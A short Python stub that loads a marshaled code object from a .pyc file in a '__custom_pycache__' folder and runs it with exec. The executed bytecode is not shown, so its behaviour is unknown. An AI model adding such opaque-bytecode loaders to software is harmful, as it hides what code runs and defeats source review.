
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'FallbackSocialTag_73b477f4db2d4d35abab04d4512ada60.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
